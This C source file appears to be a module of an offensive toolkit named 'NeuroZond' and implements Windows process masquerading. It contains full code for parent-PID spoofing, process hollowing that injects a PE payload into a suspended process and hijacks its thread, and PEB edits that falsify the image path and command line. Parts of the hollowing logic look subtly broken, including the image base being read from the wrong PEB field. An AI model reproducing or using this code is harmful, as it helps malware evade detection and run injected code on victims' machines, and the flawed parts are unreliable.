/**
 * ProcessMasquerading - Advanced process manipulation for NeuroZond
 * 
 * This module implements techniques for masking process identity in Windows:
 * - PPID Spoofing: Makes a process appear to be spawned by a different parent
 * - Process Hollowing: Replaces legitimate process memory with malicious code
 * - PEB Manipulation: Modifies the Process Environment Block to change identity
 * - Command Line Manipulation: Hides the true command line of a process
 *
 * @file process_masquerading.c
 * @author NeuroZond Team
 * @date 2025-04-18
 */

#include "process_masquerading.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

// Windows-specific structures needed for PPID spoofing
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

// Structure definitions for PEB access (simplified for this implementation)
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    // Rest of the structure is not relevant for this implementation
} PEB, *PPEB;

// Function prototypes for Windows Native API
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN ULONG ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
);

typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

/**
 * Find a process ID by its name
 * 
 * This function creates a snapshot of all processes in the system and
 * iterates through them to find a process with the specified name.
 * The search is case-insensitive.
 *
 * @param processName Wide string name of the process to find (e.g., "explorer.exe")
 * @return Process ID of the found process, or 0 if not found/error
 */
DWORD FindProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    
    // Create a snapshot of all processes in the system
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    // Get the first process from the snapshot
    if (Process32FirstW(hSnap, &pe32)) {
        do {
            // Compare process name with requested name (case-insensitive)
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe32));
    }
    
    CloseHandle(hSnap);
    return processId;
}

/**
 * Creates a new process that appears to be a child of the specified parent
 * 
 * This function implements PPID spoofing by:
 * 1. Finding the parent process ID by name
 * 2. Opening a handle to the parent process
 * 3. Initializing an attribute list with the parent process handle
 * 4. Creating a new process with the specified attributes
 *
 * The result is a process that appears to be spawned by the specified
 * parent process rather than the actual calling process.
 *
 * @param applicationName Path to the executable to run
 * @param parentProcessName Name of the process to use as parent
 * @param commandLine Command line for the new process
 * @param processInfo Structure to receive information about the new process
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SpawnProcessWithSpoofedParent(
    const wchar_t* applicationName,
    const wchar_t* parentProcessName,
    const wchar_t* commandLine,
    LPPROCESS_INFORMATION processInfo
) {
    // Find the PID of the desired parent process
    DWORD parentPid = FindProcessIdByName(parentProcessName);
    if (!parentPid) {
        return FALSE;
    }
    
    // Open a handle to the parent process
    HANDLE hParentProcess = OpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        parentPid
    );
    if (!hParentProcess) {
        return FALSE;
    }
    
    // Initialize the size and attribute count for the attribute list
    SIZE_T attributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hParentProcess);
        return FALSE;
    }
    
    // Allocate memory for the attribute list
    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = 
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(), 
            0, 
            attributeListSize
        );
    if (!pAttributeList) {
        CloseHandle(hParentProcess);
        return FALSE;
    }
    
    // Initialize the attribute list
    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeListSize)) {
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParentProcess);
        return FALSE;
    }
    
    // Add the parent process attribute to the list
    if (!UpdateProcThreadAttribute(
            pAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParentProcess,
            sizeof(HANDLE),
            NULL,
            NULL
        )) {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParentProcess);
        return FALSE;
    }
    
    // Initialize startup info with the extended attributes
    STARTUPINFOEXW startupInfoEx = { 0 };
    startupInfoEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    startupInfoEx.lpAttributeList = pAttributeList;
    
    // Copy command line to a non-const buffer since CreateProcessW may modify it
    wchar_t cmdLineCopy[MAX_PATH * 2] = { 0 };
    if (commandLine) {
        wcsncpy_s(cmdLineCopy, MAX_PATH * 2, commandLine, _TRUNCATE);
    }
    
    // Create the new process with the spoofed parent
    BOOL result = CreateProcessW(
        applicationName,               // Application name
        cmdLineCopy,                   // Command line
        NULL,                          // Process security attributes
        NULL,                          // Thread security attributes
        FALSE,                         // Inherit handles
        CREATE_SUSPENDED |             // Create suspended
        EXTENDED_STARTUPINFO_PRESENT,  // Extended startup info
        NULL,                          // Environment
        NULL,                          // Current directory
        &startupInfoEx.StartupInfo,    // Startup info
        processInfo                    // Process information
    );
    
    // Clean up resources
    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hParentProcess);
    
    return result;
}

/**
 * Replaces a legitimate process with custom code (Process Hollowing)
 * 
 * This technique involves:
 * 1. Checking if the process is valid and suspended
 * 2. Unmapping the original process image from memory
 * 3. Allocating new memory for the payload
 * 4. Copying the payload to the process
 * 5. Modifying the process context to start executing the new code
 *
 * @param pi Process information for a suspended process
 * @param payload Pointer to a valid PE file to inject
 * @param payloadSize Size of the payload
 * @return TRUE on success, FALSE on failure
 */
BOOL HollowProcess(
    PROCESS_INFORMATION pi,
    LPVOID payload,
    SIZE_T payloadSize
) {
    // Verify that we have valid process and thread handles
    if (pi.hProcess == NULL || pi.hThread == NULL) {
        return FALSE;
    }
    
    // Load required functions from ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return FALSE;
    }
    
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    pNtReadVirtualMemory NtReadVirtualMemory = 
        (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = 
        (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    
    if (!NtQueryInformationProcess || !NtUnmapViewOfSection || 
        !NtReadVirtualMemory || !NtWriteVirtualMemory) {
        return FALSE;
    }
    
    // Get process information to locate PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    
    if (NtQueryInformationProcess(
            pi.hProcess,
            0, // ProcessBasicInformation
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength
        ) != 0) {
        return FALSE;
    }
    
    // Read PEB of the target process
    PEB peb = { 0 };
    if (NtReadVirtualMemory(
            pi.hProcess,
            pbi.PebBaseAddress,
            &peb,
            sizeof(PEB),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Read image base address from the target process
    PVOID imageBaseAddress = NULL;
    if (NtReadVirtualMemory(
            pi.hProcess,
            &peb.ProcessParameters->ImagePathName.Buffer,
            &imageBaseAddress,
            sizeof(PVOID),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Parse the PE headers from the payload
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)payload + dosHeader->e_lfanew);
    
    // Check PE header magic numbers to ensure valid payload
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || 
        ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    
    // Unmap the original executable from the process
    if (NtUnmapViewOfSection(
            pi.hProcess,
            imageBaseAddress
        ) != 0) {
        return FALSE;
    }
    
    // Allocate memory in the target process for the new image
    PVOID newBaseAddress = VirtualAllocEx(
        pi.hProcess,
        (PVOID)ntHeader->OptionalHeader.ImageBase,
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!newBaseAddress) {
        // Try to allocate memory anywhere
        newBaseAddress = VirtualAllocEx(
            pi.hProcess,
            NULL,
            ntHeader->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!newBaseAddress) {
            return FALSE;
        }
    }
    
    // Write the PE headers to the target process
    if (NtWriteVirtualMemory(
            pi.hProcess,
            newBaseAddress,
            payload,
            ntHeader->OptionalHeader.SizeOfHeaders,
            NULL
        ) != 0) {
        VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Write each section to the target process
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++) {
        if (sectionHeader->SizeOfRawData > 0) {
            if (NtWriteVirtualMemory(
                    pi.hProcess,
                    (BYTE*)newBaseAddress + sectionHeader->VirtualAddress,
                    (BYTE*)payload + sectionHeader->PointerToRawData,
                    sectionHeader->SizeOfRawData,
                    NULL
                ) != 0) {
                VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
                return FALSE;
            }
        }
    }
    
    // Get thread context of the target process
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Update the image base address in the PEB of the target process
    if (NtWriteVirtualMemory(
            pi.hProcess,
            &((PPEB)pbi.PebBaseAddress)->ProcessParameters->ImagePathName.Buffer,
            &newBaseAddress,
            sizeof(PVOID),
            NULL
        ) != 0) {
        VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Update the new entry point in the thread context
#ifdef _WIN64
    context.Rcx = (DWORD_PTR)newBaseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;
#else
    context.Eax = (DWORD_PTR)newBaseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;
#endif
    
    // Set the modified context
    if (!SetThreadContext(pi.hThread, &context)) {
        VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Resume the thread to start executing the injected code
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        VirtualFreeEx(pi.hProcess, newBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    return TRUE;
}

/**
 * Modifies the image path in the Process Environment Block (PEB)
 * 
 * This function allows a process to masquerade as another by changing
 * its reported image path. This affects how the process appears in tools
 * that read the PEB to identify processes.
 *
 * @param hProcess Handle to the target process
 * @param newImagePath New image path to set in the PEB
 * @return TRUE on success, FALSE on failure
 */
BOOL ModifyProcessIdentity(
    HANDLE hProcess,
    const wchar_t* newImagePath
) {
    if (!hProcess || !newImagePath) {
        return FALSE;
    }
    
    // Load required functions from ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return FALSE;
    }
    
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtReadVirtualMemory NtReadVirtualMemory = 
        (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = 
        (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    
    if (!NtQueryInformationProcess || !NtReadVirtualMemory || !NtWriteVirtualMemory) {
        return FALSE;
    }
    
    // Get basic process information to locate PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    
    if (NtQueryInformationProcess(
            hProcess,
            0, // ProcessBasicInformation
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength
        ) != 0) {
        return FALSE;
    }
    
    // Read PEB of the target process
    PEB peb = { 0 };
    if (NtReadVirtualMemory(
            hProcess,
            pbi.PebBaseAddress,
            &peb,
            sizeof(PEB),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Read ProcessParameters from the target process
    RTL_USER_PROCESS_PARAMETERS processParams = { 0 };
    if (NtReadVirtualMemory(
            hProcess,
            peb.ProcessParameters,
            &processParams,
            sizeof(RTL_USER_PROCESS_PARAMETERS),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Allocate memory in the target process for the new image path string
    SIZE_T newImagePathLength = (wcslen(newImagePath) + 1) * sizeof(wchar_t);
    PVOID remoteImagePathBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        newImagePathLength,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remoteImagePathBuffer) {
        return FALSE;
    }
    
    // Write the new image path to the allocated memory
    if (NtWriteVirtualMemory(
            hProcess,
            remoteImagePathBuffer,
            (PVOID)newImagePath,
            newImagePathLength,
            NULL
        ) != 0) {
        VirtualFreeEx(hProcess, remoteImagePathBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Create a new UNICODE_STRING structure for the image path
    UNICODE_STRING newImagePathUS = { 0 };
    newImagePathUS.Length = (USHORT)(wcslen(newImagePath) * sizeof(wchar_t));
    newImagePathUS.MaximumLength = (USHORT)newImagePathLength;
    newImagePathUS.Buffer = (PWSTR)remoteImagePathBuffer;
    
    // Write the new UNICODE_STRING to the ImagePathName field in the process parameters
    if (NtWriteVirtualMemory(
            hProcess,
            &peb.ProcessParameters->ImagePathName,
            &newImagePathUS,
            sizeof(UNICODE_STRING),
            NULL
        ) != 0) {
        VirtualFreeEx(hProcess, remoteImagePathBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    return TRUE;
}

/**
 * Modifies the command line string in the Process Environment Block (PEB)
 * 
 * This function changes how the process's command line appears to tools
 * that inspect process information. It can be used to mask suspicious
 * command line arguments or make a process appear to have been launched
 * with different parameters.
 *
 * @param hProcess Handle to the target process
 * @param newCommandLine New command line string to set in the PEB
 * @return TRUE on success, FALSE on failure
 */
BOOL ModifyCommandLine(
    HANDLE hProcess,
    const wchar_t* newCommandLine
) {
    if (!hProcess || !newCommandLine) {
        return FALSE;
    }
    
    // Load required functions from ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return FALSE;
    }
    
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtReadVirtualMemory NtReadVirtualMemory = 
        (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = 
        (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    
    if (!NtQueryInformationProcess || !NtReadVirtualMemory || !NtWriteVirtualMemory) {
        return FALSE;
    }
    
    // Get basic process information to locate PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    
    if (NtQueryInformationProcess(
            hProcess,
            0, // ProcessBasicInformation
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength
        ) != 0) {
        return FALSE;
    }
    
    // Read PEB of the target process
    PEB peb = { 0 };
    if (NtReadVirtualMemory(
            hProcess,
            pbi.PebBaseAddress,
            &peb,
            sizeof(PEB),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Read ProcessParameters from the target process
    RTL_USER_PROCESS_PARAMETERS processParams = { 0 };
    if (NtReadVirtualMemory(
            hProcess,
            peb.ProcessParameters,
            &processParams,
            sizeof(RTL_USER_PROCESS_PARAMETERS),
            NULL
        ) != 0) {
        return FALSE;
    }
    
    // Allocate memory in the target process for the new command line string
    SIZE_T newCommandLineLength = (wcslen(newCommandLine) + 1) * sizeof(wchar_t);
    PVOID remoteCommandLineBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        newCommandLineLength,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remoteCommandLineBuffer) {
        return FALSE;
    }
    
    // Write the new command line to the allocated memory
    if (NtWriteVirtualMemory(
            hProcess,
            remoteCommandLineBuffer,
            (PVOID)newCommandLine,
            newCommandLineLength,
            NULL
        ) != 0) {
        VirtualFreeEx(hProcess, remoteCommandLineBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Create a new UNICODE_STRING structure for the command line
    UNICODE_STRING newCommandLineUS = { 0 };
    newCommandLineUS.Length = (USHORT)(wcslen(newCommandLine) * sizeof(wchar_t));
    newCommandLineUS.MaximumLength = (USHORT)newCommandLineLength;
    newCommandLineUS.Buffer = (PWSTR)remoteCommandLineBuffer;
    
    // Write the new UNICODE_STRING to the CommandLine field in the process parameters
    if (NtWriteVirtualMemory(
            hProcess,
            &peb.ProcessParameters->CommandLine,
            &newCommandLineUS,
            sizeof(UNICODE_STRING),
            NULL
        ) != 0) {
        VirtualFreeEx(hProcess, remoteCommandLineBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    return TRUE;
} 